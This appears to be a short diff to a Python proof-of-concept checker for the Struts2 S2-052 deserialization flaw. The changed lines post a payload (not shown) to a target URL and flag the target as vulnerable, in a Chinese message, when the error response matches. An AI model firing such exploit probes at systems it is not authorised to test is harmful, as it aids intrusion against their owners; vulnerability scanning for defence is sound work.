@@ -19,7 +19,7 @@ def poc(url, **kwargs):
         "Content-Type": "application/xml"
     }
     try:
-        req = requests.post(url, data=poc_goop, headers=headers_052, timeout=timeout, verify=False, )
+        req = requests.post(url, data=poc_goop, headers=headers_052, timeout=timeout, verify=True)
         result = "目标存在 Struts2-052, check url: %s" % url
         if req.status_code == 500 and r"java.security.Provider$Service" in req.text:
             return result
